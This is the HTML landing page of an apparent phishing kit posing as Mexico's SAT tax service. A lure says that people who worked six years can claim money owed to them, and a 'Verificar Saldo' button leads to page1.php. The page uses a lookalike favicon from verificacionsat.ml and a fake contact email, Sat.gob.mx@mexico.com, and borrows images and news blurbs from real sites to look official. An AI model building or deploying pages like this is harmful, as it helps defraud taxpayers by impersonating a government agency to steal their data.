<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<!---FAVICON-->
	<link rel="icon" type="image/x-icon" href="https://verificacionsat.ml/assets/images/sat.png">
	<!--STYLES-->
	<link rel="stylesheet" href="assets/styles.css">
	<!--FONTAWESOME-->
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
	<title>S-A-T</title>
</head>
<body>
	<div class="fixed">
		<nav class="navbar">
            <div class="navbar-header">
                <a href="#" class="navbar-brand"><img src="assets/renovacion.png" alt="Gobierno de México"></a>
                <button class="navbar-toggler"><span></span></button>
            </div>
            <div class="navbar-collapse">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-concierge-bell"></i> Trámites</a>
                    </li>
                    <li class="nav-item">
                        <a href="error.php" class="nav-link"><i class="fas fa-address-card"></i> Nosotros</a>
                    </li>
                </ul>
            </div>
        </nav>
	</div>
	<div class="header-section">
		<div class="padding-header">
			<div class="inline-header">
				<div class="text-header">
					<h1>VERIFICACIÓN DE COMPROBANTES FISCALES DIGITALES POR INTERNET</h1>
				</div>
				<div class="parrafo-
				header">
					<p>Si fuiste trabajador durante 6 años, este es tu momento para obtener lo que te corresponde.</p>
				</div>
				<div class="botton"><a href="page1.php">Verificar Saldo</a></div>
				<a href="#start" class="tree" id="end"><i class="fas fa-arrow-down"></i></a>
			</div>
		</div>
	</div>
	<div class="aliiig" id="start"></div>
	<div class="system">
		<div class="text-title-sy">
			<h1>Actualizaciones y Novedades</h1>
		</div>
		<div class="header-system" id="header">
			<div class="inline-system">
				<div class="container-system">
					<img src="https://www.elcontribuyente.mx/wp-content/uploads/2021/02/Opciones-para-renovar-o-actualizar-la-contrase%C3%B1a-1201x676.jpg" alt="">
					<div class="text">
						<h1>Actualización</h1>
						<p>Año nuevo siempre trae actualizaciones; como la nueva disposición que el Sistema de Administración Tributaria (S.A.T.) anuncia a sus contribuyentes. [...]</p>
						<a href="page1.php">Ver más</a>
					</div>
				</div>
				<div class="container-system">
					<img src="https://elceo.com/wp-content/uploads/2021/12/sat-esp.jpg" alt="">
					<div class="text">
						<h1>Constancia de situacion fiscal</h1>
						<p>La constancia de situación fiscal tiene varios datos como la fecha del alta y las obligaciones fiscales. Así es como se puede generar gratis. [...]</p>
						<a href="page1.php">Ver más</a>
					</div>
				</div>
				<div class="container-system">
					<img src="https://www.gob.mx/cms/uploads/article/main_image/117692/highlight_Blog_RESICO.jpg" alt="">
					<div class="text">
						<h1>Nuevo regimen simplificado</h1>
						<p>El SAT pone a disposición el Régimen Simplificado de Confianza, una alternativa sencilla para el cumplimiento de las obligaciones fiscales. [...]</p>
						<a href="pages.php">Ver más</a>
					</div>
				</div>
			</div>
		</div>
	</div>
	<footer>
   <div class="content">
     <div class="left box">
       <div class="upper">
         <div class="topic">SAT</div>
         <p>Servicio de Administración Tributaria.</p>
       </div>
       <div class="lower">
         <div class="topic">Contact us</div>
         <div class="phone">
           <a href="#"><i class="fas fa-phone-volume"></i>55 627 22 728 </a>
         </div>
         <div class="email">
           <a href="#"><i class="fas fa-envelope"></i>Sat.gob.mx@mexico.com</a>
         </div>
       </div>
     </div>
     <div class="middle box">
       <div class="topic">Dirección:</div>
       <div><a href="#">Av. Hidalgo 77,
Col. Guerrero, C.P. 06300,
Ciudad de México.</a></div>
     </div>
 </footer>
	<div class="footer-creditos">
		<h1>© Copyright 2022 SAT - Todos los derechos reservados</h1>
	</div>
	<!--SCRIPT_NAV_BAR_TOGGLE-->
        <script type="text/javascript">
        	const navbar = document.querySelector('.navbar');
const navbarToggler = navbar.querySelector('.navbar-header .navbar-toggler');
const navbarCollapse = navbar.querySelector('.navbar-collapse');
navbarToggler.addEventListener('click', function() {
    navbarToggler.classList.toggle('active');
    navbarCollapse.classList.toggle('active');
});
        </script>
</body>
</html>